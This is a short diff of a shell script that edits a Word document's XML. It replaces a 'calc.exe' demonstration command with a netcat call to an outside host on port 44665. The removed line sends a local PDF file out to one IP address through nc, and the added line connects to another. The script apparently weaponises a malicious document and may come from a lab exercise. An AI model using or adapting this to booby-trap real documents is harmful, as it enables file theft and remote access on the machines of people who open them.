@@ -16,7 +16,7 @@ unzip "$INPUT"
 echo Before:
 egrep -io '.{30}cmd.exe.{40}' word/document.xml
 
-cat word/document.xml | sed "s/calc.exe/nc.exe 10.142.0.11 44665 < C:\/GreatBookPage7.pdf/" > a
+cat word/document.xml | sed "s/calc.exe/nc.exe 10.142.0.3 44665/" > a
 mv a word/document.xml
 
 echo After:
